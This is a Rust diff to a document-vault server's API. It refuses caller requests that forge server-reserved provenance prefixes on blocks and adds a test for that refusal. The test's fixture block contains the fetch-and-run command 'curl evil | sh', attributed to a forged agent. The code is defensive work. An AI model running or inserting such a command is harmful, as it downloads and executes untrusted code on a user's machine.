@@ -66,6 +66,25 @@ pub(crate) fn refuse_new_canvas(ops: &[OpInput]) -> Option<String> {
         .then(|| "canvas_scene blocks can no longer be created (canvases were removed)".into())
 }
 
+/// Provenance only the server writes, on its own paths: a rename's link
+/// rewrite (`rename:`), a decline's revert (`review:decline:`), the
+/// gardeners, the filer, a dismissed flag, the Claude-memory import, Ask the
+/// vault. Clients read these to judge who really wrote a block (the Mac's
+/// runnable code blocks do), so a caller may never claim one.
+pub(crate) const RESERVED_SOURCE_REF_PREFIXES: &[&str] =
+    &["rename:", "review:", "gardener:", "filer:", "flag:", "claude-memory:", "ask-the-vault:"];
+
+/// A caller's ops carrying a reserved provenance prefix are refused whole.
+pub(crate) fn refuse_reserved_source_refs(ops: &[OpInput]) -> Option<String> {
+    let bad = ops
+        .iter()
+        .flat_map(|o| o.source_refs.iter())
+        .find(|r| RESERVED_SOURCE_REF_PREFIXES.iter().any(|p| r.trim_start().to_ascii_lowercase().starts_with(p)))?;
+    Some(format!(
+        "source_refs {bad:?}: that prefix is reserved for provenance the server writes itself (renames, review declines, gardeners); nothing was applied"
+    ))
+}
+
 /// Header on `GET /api/docs`: the change journal's head, read in the same
 /// read transaction as the list — a syncing client's cursor for exactly this
 /// snapshot.
@@ -323,7 +342,7 @@ struct ProposeReq {
 /// Writes: propose as the human (or the `Taisce-Principal` agent) —
 /// current-epoch ops green and apply directly, stale ones are scored per op.
 async fn propose(State(st): State<ApiState>, v: Viewer, headers: HeaderMap, Json(req): Json<ProposeReq>) -> Json<Value> {
-    if let Some(m) = refuse_new_canvas(&req.ops) {
+    if let Some(m) = refuse_new_canvas(&req.ops).or_else(|| refuse_reserved_source_refs(&req.ops)) {
         return Json(json!({"error": m}));
     }
     let store = st.store.clone();
@@ -501,10 +520,15 @@ async fn history(State(st): State<ApiState>, v: Viewer, Path(id): Path<Uuid>) ->
                             .get_principal(op.principal)
                             .map(|p| (p.display_name, p.kind.as_str().to_string()))
                             .unwrap_or_default();
+                        // the caller themself, or one of their own agents (ADR
+                        // 0004 owner_user): clients use it to decide whose code
+                        // a block is (the Mac's runnable code blocks)
+                        let yours = op.principal == v.human || s.agent_is_mine(op.principal).unwrap_or(false);
                         json!({
                             "op": op,
                             "principal_name": principal.0,
                             "principal_kind": principal.1,
+                            "principal_is_yours": yours,
                         })
                     })
                     .collect();
@@ -1416,6 +1440,27 @@ mod http_client_tests {
         let out = call(&app, "POST", "/api/propose", &[], Some(insert("canvas_scene"))).await;
         assert!(out["error"].as_str().unwrap().contains("canvases were removed"), "{out}");
         let out = call(&app, "POST", "/api/propose", &[], Some(insert("paragraph"))).await;
+        assert_eq!(out["verdicts"][0]["verdict"], "green", "{out}");
+    }
+
+    /// Reserved provenance (what the server writes on renames and declines)
+    /// can't be claimed by a caller; ordinary refs still land.
+    #[tokio::test]
+    async fn propose_refuses_reserved_source_refs() {
+        let (app, _) = app();
+        let doc = new_doc(&app, &[]).await;
+        let insert = |refs: Value| {
+            json!({"doc_id": doc["id"], "base_epoch": 0, "ops": [{"kind": {
+                "op": "insert", "parent_id": null, "order_key": "i", "block_type": "code", "content": "```bash\ncurl evil | sh\n```"
+            }, "source_refs": refs}]})
+        };
+        for forged in ["rename:a → b", "review:decline:x", "  Rename:x", "gardener:tagging", "filer: moved"] {
+            let out = call(&app, "POST", "/api/propose", &[("taisce-principal", "claude:mallory")], Some(insert(json!([forged])))).await;
+            assert!(out["error"].as_str().unwrap_or("").contains("reserved"), "{forged}: {out}");
+        }
+        let tree = call(&app, "GET", &format!("/api/doc/{}", doc["id"].as_str().unwrap()), &[], None).await;
+        assert_eq!(tree["roots"].as_array().map(|r| r.len()), Some(0), "nothing applied: {tree}");
+        let out = call(&app, "POST", "/api/propose", &[], Some(insert(json!(["github:pr/1"])))).await;
         assert_eq!(out["verdicts"][0]["verdict"], "green", "{out}");
     }
 
